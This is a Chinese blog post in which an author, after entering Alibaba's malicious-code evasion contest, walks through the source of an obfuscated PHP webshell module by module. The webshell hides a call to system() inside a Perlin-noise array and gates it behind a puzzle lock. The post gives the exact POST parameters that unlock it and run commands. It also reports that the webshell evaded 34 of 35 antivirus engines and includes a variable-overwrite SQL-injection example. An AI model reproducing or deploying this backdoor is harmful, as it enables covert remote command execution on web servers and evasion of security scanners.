# 记一次多平台免杀PHP木马的制作过程 - 掘金
![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/75d04b92-362c-40cd-9ed9-f86ec5127efe.webp?raw=true)

* * *

最开始萌生出写免杀WebShell的想法是这个月初上网时，偶然看到了阿里安全应急响应平台的一则线上活动“第三届伏魔恶意代码挑战赛”的报名公告，**大致看了一下之后发现该比赛的内容为编写`PHP`、`JSP`、`Python`或`Bash`语言的后门代码，若编写的代码通过了阿里最新一代检测引擎（即挑战靶场）的检测，并且不和别的师傅重复之后就算比赛通过了**。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/10554547-7819-47f6-a19d-ea5904ef6993.webp?raw=true)

鉴于我对`PHP`语言和网络安全方面较为了解，于是我就抱着试一试的心态报名了`PHP`赛道。在奋战了4天之后，我编写出了一个`215`行的PHP命令执行后门，并成功通过了现有的数十个云查杀引擎的检测。但还是非常遗憾，当比赛靶场开放的第一时间，我就将后门上传检测，最终是没能通过比赛，心里也是有一点点失落的（毕竟这还是我第一次接触免杀 QwQ）。~┐=͟͟͞͞(￣ー￣)┌~

于是在询问了钉钉群里的负责人员之后，决定在比赛结束之后将WebShell公布了出来，权当是一次学习经历了：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/fcf08cb1-babf-483f-9c1e-4ade6102aff9.webp?raw=true)

> 项目地址：1\. [PerlinPuzzle-Webshell-PHP - Gitee](https://link.juejin.cn/?target=https%3A%2F%2Fgitee.com%2Ficewolf00%2Fperlin-puzzle-webshell-php "https://gitee.com/icewolf00/perlin-puzzle-webshell-php")  
>      2\. [PerlinPuzzle-Webshell-PHP - GitHub](https://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Ficewolf-sec%2FPerlinPuzzle-Webshell-PHP "https://github.com/icewolf-sec/PerlinPuzzle-Webshell-PHP")

* * *

> **本人于2024年01月19日公开此WebShell前，从未向任何安全平台提交绕过漏洞报告，也从未领取任何安全平台的漏洞赏金或安全币。** 

* * *

> 文件MD5值：`7c0aeaec06454e588120877fd18cd0c8`  
> 文件SHA256值：`f53d5dd4de1b39ba5e5751f42f5e97b1a28383cf81c276151ef6066661f4f2b6`

最后一次绕过测试于`2024年01月18日`进行，**共使用了`35`个云查杀引擎进行检测，成功通过`34`个，报毒率为`2.9%`**。

**成功通过：** 

*   **阿里伏魔引擎**
*   **安恒云沙箱**
*   **大圣云沙箱（风险评分`0.19`）**
*   **河马WebShell查杀**
*   **魔盾云沙箱**
*   **微步集成引擎共26个（微软、卡巴斯基、IKARUS、Avast、GDATA、安天、360、NANO、瑞星、Sophos、WebShell专杀、MicroAPT、OneStatic、ESET、小红伞、大蜘蛛、AVG、K7、江民、Baidu、TrustBook、熊猫、ClamAV、Baidu-China、OneAV、MicroNonPE）**
*   **D盾**
*   **Windows Defender**
*   **火绒安全软件**

**未通过：** 

*   **长亭百川WebShell检测平台**

（再临时补一张`VirusTotal`的截图）

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/23990e2a-432b-46df-8b37-c471f4400075.webp?raw=true)

* * *

要使用本WebShell，需要在`POST`方法中添加`3`个参数：

*   **wpstring     =>    `ABBCCD`**
*   **b           =>    `s`**
*   **pcs          =>    `<要执行的命令>`**

比如：

```Text
POST /perlin.php HTTP/1.1
Host: 127.0.0.1:7000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Length: 35

wpstring=ABBCCD&b=s&pcs=hostnamectl

```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/611e200a-ed43-4900-8141-a35958f14d68.webp?raw=true)

* * *

1.  **操作系统**：`Windows`、`Linux`、`macOS`
2.  **PHP版本**：PHP `5` 全版本、PHP `7` 全版本、PHP `8` 全版本

* * *

*   使用刻意编写的**变量覆盖漏洞**传递参数；
*   使用线性代数中的**循环群运算**原理制作程序锁定器；
*   **在“柏林噪声”随机数生成算法生成的数组中添加关键危险字符**；
*   关键危险字符的生成内容由程序锁定器的运算结果决定，**若运算错误则无法生成正确字符**；
*   在**程序的执行过程中使用阻断器**，若未解锁则阻断函数返回值传递
*   使用超长行注释干扰词法引擎。

* * *

本WebShell由`4`个模块组成：

*   **`InazumaPuzzle`程序锁定器类**
*   **`PerlinNoise`危险函数生成与执行类**
*   **变量传值覆盖模块**
*   **代码执行阻断模块**

下面将对这4个模块进行逐一讲解。

变量传值覆盖模块
--------

在对这个模块进行介绍前，我们首先需要了解一下**变量覆盖漏洞**。

> **变量覆盖漏洞：可以将自定义的参数值替换掉原有变量值的漏洞。** 

在`PHP`的实际开发中，我们会经常使用如下语句：

```PHP
<?php
    foreach ($_REQUEST as $key => $value) { $$key = $value; }
?>

```

相信很多熟悉`PHP`的读者都知道这是**从HTTP请求中注册变量**的代码。**该段代码使用`foreach`语句遍历请求数组，随后根据`HTTP`参数名依次创建变量。**  使用这种方法可以极大地简便我们开发的过程，但如果一些关键的变量可以被攻击者控制，又会发生什么事呢？

```PHP
<?php
    $security_check = true;
    foreach ($REQUEST as $key => $value) { $$key = $value; }
    if ($security_check) {
        $id = parse_sql($_POST['id']);
    } else { $id = $_POST['id']; }
    $result = $sqlOperator -> query($id);
    var_dump($result);
?>

```

这时攻击者可以从`GET`或`POST`控制`$security_check`变量。**如果传入了`false`值，那么程序的SQL注入检查会被关闭，造成SQL注入。** （**前提是关键变量的赋值定义不出现在变量注册语句之后**）

本WebShell刻意引入了一个变量覆盖语句，使用该语句来传递关键参数：

```PHP
<?php
    header("Content-type:text/html;charset=utf-8");
    foreach($_POST as $key => $value) $$key = $value;
    if (strlen($wpstring) === 0) die("笨蛋！先启动原神解个稻妻雷元素方块阵再来吧！");
    $puzz_writeup = array();
    for ($i = 0; $i < strlen($wpstring); $i++) array_push($puzz_writeup, $wpstring[$i]); 
?>

```

**在上述代码中，使用`foreach`语句遍历请求数组注册变量，随后验证程序解锁答案的长度，接着将解锁答案复制到数组里。这样程序锁定器就可以使用解锁答案了。** 

代码执行阻断模块
--------

该模块由`pause()`函数组成，**该函数接收程序流程中传来的返回值，检查程序的解锁状态，若程序解锁则将返回值传给下面的程序流程，若未解锁则使用`die()`函数退出程序**：

```PHP
<?php
    function pause($obj) {
        global $appor5nnb;
        if (!$appor5nnb -> getLockerStatus()) die();
        return $obj;
    }
?>

```

该模块主要用于对抗云查杀引擎的动态污点分析。

InazumaPuzzle程序锁定器
------------------

为了对抗云查杀引擎的动态污点分析，本程序实现了一个**线性代数循环群运算模拟器**，**该模块接收一个`PHP`数组形式的传入值，随后依据传入值对对象中的4个成员变量执行循环群运算，当运算结束之后如果4个成员变量的值相等，即视为程序解锁**。

本模块的设计灵感来源于开放世界游戏《原神》中于稻妻地区境内广泛存在的一种大世界解谜机关阵列“**机关立方**”。**该机关阵列由数个小型立方机关组成，当其中一个机关受到击打时，会联动阵列内的其它组成机关一起转动，其本质是实现了一个线性代数中“循环群”的运算模拟系统**。原理图如下：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/bb444cac-a50b-4000-ad75-166e7c7a1476.webp?raw=true)

将其转换为线性代数方程，如下：

range=\[012\]Aj=\[1100111001110011\]o=\[x1x2x3x4\]s=\[2002\]e=\[2222\]Aj.o+s=erange = \\begin{bmatrix}0\\quad1\\quad2\\\\\end{bmatrix} \\\ A\_j=\\begin{bmatrix} 1&1&0&0\\\ 1&1&1&0\\\ 0&1&1&1\\\ 0&0&1&1\\\ \\end{bmatrix} o=\\begin{bmatrix} x\_1\\\ x\_2\\\ x\_3\\\ x\_4\\\ \\end{bmatrix} s=\\begin{bmatrix} 2\\\ 0\\\ 0\\\ 2\\\ \\end{bmatrix} e=\\begin{bmatrix} 2\\\ 2\\\ 2\\\ 2\\\ \\end{bmatrix} \\\ A\_j.o + s = e

这时我们可以根据**高斯-若尔当消元法**得出 o=\[1221\]o=\\begin{bmatrix}1\\\2\\\2\\\1\\\\\end{bmatrix}

作者依照上述内容编写了程序解锁模块类`InazumaPuzzle`，**该类中有4个关键类成员变量`blockA`、`blockB`、`blockC`、`blockD`，用于存放上图中4个机关方块的状态**；类中还有如下关键成员函数：

*   `setBackBlock()`
*   `hit()`
*   `__AFG50CE4_RG1()`
*   `getLockerStatus()`

其中，`setBackBlock()`函数的作用为**当要操作的成员变量数值即将超过循环群最大数值`$maxType`时，将其复位为循环群最小数值`$setType`**，其代码如下：**（最大数值为`2`，最小数值为`0`）**

```PHP
<?php
private function setBackBlock($block){
    $setType = $this-> MIN_ENUM;
    $maxType = $this -> MAX_ENUM;
    switch ($block) {
        case 'A':
            if ($this -> blockA == $maxType) {
                $this -> blockA = $setType;
                return true;
            } else return false;
        case 'B':
            if ($this -> blockB== $maxType) {
                $this -> blockB = $setType;
                return true;
            } else return false;
        case 'C':
            if ($this-> blockC == $maxType){
                $this -> blockC = $setType;
                return true;
            } else return false;
        case 'D':
            if ($this -> blockD== $maxType) {
                $this -> blockD = $setType;
                return true;
            } else return false;
        default: throw new Exception("bad_args", 1);
    }
}
?>

```

**可以看到如果成员变量的整数值如果未达到临界值，返回`false`，不操作成员变量；如果达到临界值，则将其复位后返回`true`。** 

`hit()`函数的功能根据原理图公式中的量`Aj`编写，**实模拟现了“击打一个方块带动周围方块转动”的功能**：

```PHP
<?php
private function hit($blockIdx) {
    global $text;
    $text = urldecode("%6e%69%6c%72%65%70%5f%46%46%49%44");
    switch ($blockIdx) {
        case "A":
            if (!$this -> setBackBlock("A")) $this -> blockA += 1;
            if (!$this -> setBackBlock("B")) $this -> blockB += 1;
            break;
        case "B":
            if (!$this -> setBackBlock("A")) $this -> blockA += 1;
            if (!$this -> setBackBlock("B")) $this -> blockB += 1;
            if (!$this -> setBackBlock("C")) $this -> blockC += 1;
            break;
        case "C":
            if (!$this -> setBackBlock("B")) $this -> blockB += 1;
            if (!$this -> setBackBlock("C")) $this -> blockC += 1;
            if (!$this -> setBackBlock("D")) $this -> blockD += 1;
            break;
        case "D":
            if (!$this -> setBackBlock("C")) $this -> blockC += 1;
            if (!$this -> setBackBlock("D")) $this -> blockD += 1;
            break;
        default: throw new Exception("bad_args", 1);
        }
}
?>

```

可以看到该函数核心为调用`setBackBlock()`函数或将成员函数值加`1`，**如果`setBackBlock()`函数返回`true`，则代表成员函数值已经被使用循环群运算方法加`1`，不需要再次加`1`**；否则手动加`1`。**（比如，如果接收的传入值为`A`，则击打`A`、`B`；如果传入值为`B`，则击打`A`、`B`、`C`；以此类推）**

`__AFG50CE4_RG1()`函数的作用为**接收答案数组并根据数组的每个值调用`hit()`函数**，模拟实现根据答案值击打方块，其代码如下：

```PHP
<?php
public function __AFG50CE4_RG1() {
    global $puzz_writeup;
    if (count($puzz_writeup) === 0) throw new Exception("Invalid WriteUP",1);
    for ($i = 0; $i < count($puzz_writeup);$i++) {
        if (strcmp($puzz_writeup[$i],"A") !== 0 and strcmp($puzz_writeup[$i],"B") !== 0 and strcmp($puzz_writeup[$i],"C") !== 0 and strcmp($puzz_writeup[$i],"D") !== 0) die("笨蛋笨蛋笨蛋笨蛋！！~ 都...都跟你说了答案里只能有ABCD的......");
    }
    for ($i = 0; $i < count($puzz_writeup); $i++) $this -> hit($puzz_writeup[$i]);
    global $userans;
    $userans = $this ->blockA + $this -> blockB + $this -> blockC + $this -> blockD;
}
?>

```

可以看到函数首先载入了被**变量覆盖传值模块**初始化的答案数组变量`$puzz_writeup`；接着校验数组的长度和数组中的每个答案字符串，如果不符合格式要求则退出程序；**然后遍历数组，取出数组中的每一个字符串之后将其作为参数来调用`hit()`函数，实现“击打”功能；最后初始化全局变量`$userans`，其值设置为对象中`4`个成员变量数值的和**。

> P.S. **根据类构造函数的设计，4个成员变量初始值分别为`2`、`0`、`0`、`2`，若击打正确，则4个数的和应该为`8`。** 

`getLockerStatus()`函数的功能很简单，**只是判断对象中4个成员变量数值是否相等，若相等则判定程序解锁**，其代码如下：

```PHP
<?php
public function getLockerStatus() {
    global $text;
    $text = strrev($text);
    if ($this -> blockA ===$this -> blockB and $this -> blockA === $this -> blockC and $this -> blockA === $this -> blockD) return true;
    else return false;
}
?>

```

在程序主干中，程序先使用**变量覆盖传值模块**传递关键变量，**随后会初始化`InazumaPuzzle`类并调用`__AFG50CE4_RG1()`解锁函数尝试解除程序的锁定**。若解锁失败，则无法初始化下面的`PerlinNoise`类并退出程序，如图：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2024/1/71c5548f-3401-4cc3-9f4f-24a14b1c7da8.webp?raw=true)

PerlinNoise危险函数生成与执行类
---------------------

> 柏林噪声：**一种随机数生成算法**。柏林噪声基于随机，并在此基础上利用缓动曲线进行平滑插值，使得最终得到噪声效果更加趋于自然。**基于不同的采样空间，柏林噪声可以分为一维、二维和三维**。该随机数生成算法常用于计算机图形学中。

正常来说，一维柏林函数生成器代码是这样的：

```C++
int[] perm = {...};
float[] grad = {...};
void Hash(ref int[] gradient, int x, int y) {
    int permIdx[] = new int[2];
    permIdx[0] = FindIndex(x);
    permIdx[1] = FindIndex(y);
    int gradIdx[] = new int[2];
    gradIdx[0] = perm[permIdx[0]];
    gradIdx[1] = perm[permIdx[1]];
    gradient[0] = grad[gradIdx[0]];
    gradient[1] = grad[gradIdx[1]];
}
float perlin(float x) {
    int x1 = floor(x);
    int x2 = x1 + 1;
    float grad1 = perm[x1 % 255] * 2.0 - 255.0;
    float grad2 = perm[x2 % 255] * 2.0 - 255.0;
    float vec1 = x - x1;
    float vec3 = x - x2;
    float t = 3 * pow(vec1, 2) - 2 * pow(vec1, 3);
    float product1 = grad1 * vec1;
    float product2 = grad2 * vec2;
    return product1 + t * (product2 - product1);
}

```

但是作者将一维柏林函数生成算法进行修改，**在生成数组的第`400`位至第`405`位中埋入后门**，实现了命令执行函数`system()`的隐藏调用。

该类中有如下关键函数：

*   **构造函数**
*   **`randomFloat()`基于时间的随机值生成器**
*   **`__PLvB4CR0_Z()`排列表生成器**
*   **`__PLAB4CR0_o()`梯度表生成器**
*   **`__CPRBB0R0_l()`埋有后门的柏林噪声生成器**
*   **`__HNBB70CA_5()`埋有后门的柏林噪声显示器**

接下来依次介绍上面的函数。

### 构造函数

构造函数接收`4`个参数：

*   `arrlength`柏林噪声数组长度；
*   `MAX_INPUT`梯度数最大值；
*   `MIN_INPUT`梯度数最小值；
*   **`source`梯度值数据源（若为`DIFF_PERLIN`开启后门模式）**

构造函数首先载入了全局程序锁定器对象，随后调用`InazumaPuzzle::getLockerStatus()`方法判断程序锁定情况，若未解锁则退出程序；**接着判断传入的要生成的柏林噪声数的数量，若不符合要求则报错；然后根据`source`参数判断是否开启后门模式。最后将4个参数配置保存在类成员变量中**。

```PHP
<?php
public function __construct($arrLength, $MAX_INPUT = 700.4, $MIN_INPUT = 56.7, $source = "GENERATE") {
    global $appor5nnb;
    if (!$appor5nnb -> getLockerStatus()) die("嗯哼，笨蛋杂鱼欧尼酱~ 果然解不开吧~");
    if ($arrLength < 3000 or $arrLength > 9999) {
        throw new InvalidArgumentException("Error: Invaild Length");
    }
    if (strcmp($source,"DIFF_PERLIN") == 0) {
        $this -> BAD_ARGS = true;
        $source = "GENERATE";
    }
    $this -> arrLength = $arrLength;
    $this -> source = $source;
    $this -> INPUT_NUM_MAX = $MAX_INPUT;
    $this -> INPUT_NUM_MIN = $MIN_INPUT;
}
?>

```

### 基于时间的随机值生成器

`randomFloat()`函数的原理比较简单，就是**根据时间种子和梯度数的极值配置生成每个梯度数，生成的梯度数为小数**：

```PHP
<?php
private function randomFloat(){
    $_ = 110+4;
    $__ = ((int)(600/2))-184;
    $___ = 115;
    $____ = 100-2;
    $_____ = 117;
    $______ = 113+2;
    
    $max = $this -> INPUT_NUM_MAX;
    $min = $this -> INPUT_NUM_MIN;
    $num = $min + mt_rand() / mt_getrandmax() * ($max - $min);
    return sprintf("%.2f",$num);
}
?>

```

### 排列表生成器

`__PLvB4CR0_Z()`函数为排列表生成器，**该函数实际上为基于时间的随机整数生成器**，生成数量为指定的柏林噪声数组长度，保存于类中的数组成员变量`$seeds_array`中：

```PHP
<?php
private function __PLvB4CR0_Z() {
    srand(time());
    for ($i = 0; $i < $this -> arrLength; $i++) {
        $eachNum = pause(rand(0,255));
        array_push($this -> seeds_array, $eachNum);
    }
}
?>

```

### 梯度表生成器

`__PLAB4CR0_o()`函数为梯度表生成器，其实际功能较为简单。**该函数读取类成员变量`$source`的值，根据该值决定梯度数的数据源（实际上只能进行随机值生成），随后调用`randomFloat()`函数生成`2`位随机小数**，生成的数量为指定的柏林噪声数组长度，生成的数组保存在类数组成员变量`$inputNumArray`中：

```PHP
<?php
private function __PLAB4CR0_o() {
    if (strcmp($this -> source, "GENERATE") == 0) {
        srand(time());
        for ($i = 0; $i < $this -> arrLength; $i++) {
            $eachNum = pause($this -> randomFloat());
            array_push($this -> inputNumArray, floatval($eachNum));
        }
    } else if (strcmp($this -> source,"SYSLOG") == 0) {
        $handle = fopen("/etc/messages","r");
        $count = 0;
        while(($char = fgetc($handle)) !== false) {
            if ($count == $this -> INPUT_NUM_MAX - 1) break;
            if (($ascii_value = ord($char)) and $ascii_value % 1 !== 0) {
                array_push($this -> inputNumArray, sprintf("%.2f",$ascii_value / 2.3));
                $count++;
            } else continue;
        }
    }
}
?>

```

### 埋有后门的柏林噪声生成器

`__CPRBB0R0_l()`函数为柏林噪声生成器，该函数中埋有后门。**该函数首先载入全局变量`$userans`，值为锁定器4个成员变量的和（正常为`8`）；随后根据变量`$userans`的值进行数学运算操作，指定生成危险函数字母的`ASCII`值，并将其写入特定位置中。（第`400`位至第`405`位）** 其它位则为正常的柏林噪声数字。生成的柏林噪声数组保存在类数组成员变量`$perlin_noise`中。

```PHP
<?php
public function __CPRBB0R0_l() {
    global $userans;
    for ($i = 0; $i < $this -> arrLength; $i++) {
        if ($this -> BAD_ARGS) {
            if ($i > ($userans+391) and $i < (pause($userans+390+8))) {
                $result = array($userans + 101,$userans + 93,$userans + (50*2+8),$userans + 992-(800+85),105+($userans + 8),110+($userans+57)-60);
                array_push($this -> perlin_noise, $result[$i - 400]);
                continue;
            }
        }
    $cache = $this -> inputNumArray[$i];
    $x1 = round($cache);
    $x2 = $x1 + 1;
    $grad1 = $this -> seeds_array[$x1 % 255] * 2.0 - 255.0;
    $grad2 = $this -> seeds_array[$x2 % 255] * 2.0 - 255.0;
    $vec1 = $i - $x1;
    $vec2 = $i - $x2;
    $t = 3 * pow($vec1, 2) - 2 * pow($vec1, 3);
    $product1 = $grad1 * $vec1;
    $product2 = $grad2 * $vec2;
    $result = $product1 + $t * ($product2 - $product1);
    array_push($this -> perlin_noise, $result);
    }
}
?>

```

### 柏林噪声显示器

`__HNBB70CA_5()`函数为柏林噪声显示器，该函数使用**动态函数调用**执行`system()`命令执行函数。该函数首先使用**EL表达式**和**数字转字符串**的方式载入了`$userans`、`$b`和`$pcs`三个变量 **（其中`$b`为危险函数的第一位字母，`$pcs`为要执行的命令）**，随后读取了柏林噪声数组`$perlin_noise`中**危险函数名称区域**的数值并将其保存到数组`$cache_noise`中，紧接着又将其值复制到数组`$temp_noise`中 **（复制时故意少读一位）**，**随后将其转化为字符串并进行多次反转、拼接和阻断后，在整个程序的第`123`行执行了`system()`函数**。

```PHP
<?php
public function __HNBB70CA_5() {
    global $userans;
    global ${strval(chr(90+$userans))};
    global ${implode(array(chr(120-$userans),chr($userans+91),chr(70-$userans+53)))};
    $cache_noise = pause(array());
    for ($i = 400; $i < 406; $i++) {
        array_push($cache_noise,$this -> perlin_noise[$i]);
    }
    $temp_noise = array();
    for ($i = 0; $i < count($cache_noise); $i++) {
        array_push($temp_noise, $cache_noise[$i]);
    }
    for ($i = 0; $i < count($temp_noise); $i++) {
        $temp_noise[$i] = chr($temp_noise[$i]);
    }
    $ab = pause(array_map(function($arr){ return chr($arr); },array_slice($this -> perlin_noise,(188*2)+$userans*3,$userans-3)));
    $c = strval(sprintf("%s%s",$b,pause(strrev(implode("",pause($ab))))));
    $c($pcs);
    
    die(urldecode("%3c%62%72%3e%3c%62%72%3e"));
    var_dump(array_slice($this -> perlin_noise,1000,800));
    }
}
?>

```

程序主干
----

```PHP
<?php
    $appor5nnb = new InazumaPuzzle();
    $appor5nnb -> __AFG50CE4_RG1();
    $cvb33ff55 = new PerlinNoise(3000, 700.4, 56.7, "DIFF_PERLIN");
    $cvb33ff55->__BHUYTVV8_1();
    $cvb33ff55 -> __CPRBB0R0_l();
    $cvb33ff55 ->__HNBB70CA_5();
?>

```

**可以看到，程序主干处首先创建了`InazumaPuzzle`程序锁定器，随后调用了`InazumaPuzzle::__AFG50CE4_RG1()`函数尝试对程序执行解锁操作，紧接着程序创建了埋有后门的柏林噪声生成器并打开了后门模式，然后生成了梯度表和排列表，最后调用内置后门的柏林噪声打印函数执行了命令。** 

* * *

1.  [【数学原理】稻妻方块解密的数学原理-原神社区-米游社](https://link.juejin.cn/?target=https%3A%2F%2Fwww.miyoushe.com%2Fys%2Farticle%2F17414097 "https://www.miyoushe.com/ys/article/17414097")
2.  [\[Nature of Code\] 柏林噪声 - 知乎](https://link.juejin.cn/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F206271895%3Fivk_sa%3D1024320u%26utm_id%3D0 "https://zhuanlan.zhihu.com/p/206271895?ivk_sa=1024320u&utm_id=0")
3.  [变量覆盖漏洞总结-CSDN博客](https://link.juejin.cn/?target=https%3A%2F%2Fblog.csdn.net%2Fqq_45521281%2Farticle%2Fdetails%2F105849770 "https://blog.csdn.net/qq_45521281/article/details/105849770")